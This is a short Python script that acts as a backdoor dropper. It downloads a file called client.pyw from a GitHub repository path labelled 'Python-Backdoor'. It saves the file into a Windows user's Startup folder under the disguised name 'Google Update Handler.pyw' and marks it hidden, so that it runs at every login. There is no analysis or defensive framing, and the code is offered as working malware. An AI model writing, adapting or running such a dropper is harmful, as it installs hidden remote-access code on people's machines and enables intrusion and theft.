import requests, ctypes, os

client = "https://raw.githubusercontent.com/gratisCobalt/Im-a-dolphin/master/externalModules/Python-Backdoor/client.pyw"
path = os.path.join("C:/Users/Dominik/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup", "Google Update Handler.pyw")
r = requests.get(client)

with open (path, "wb") as f:
    f.write(r.content)

ctypes.windll.kernel32.SetFileAttributesW(path, 2)
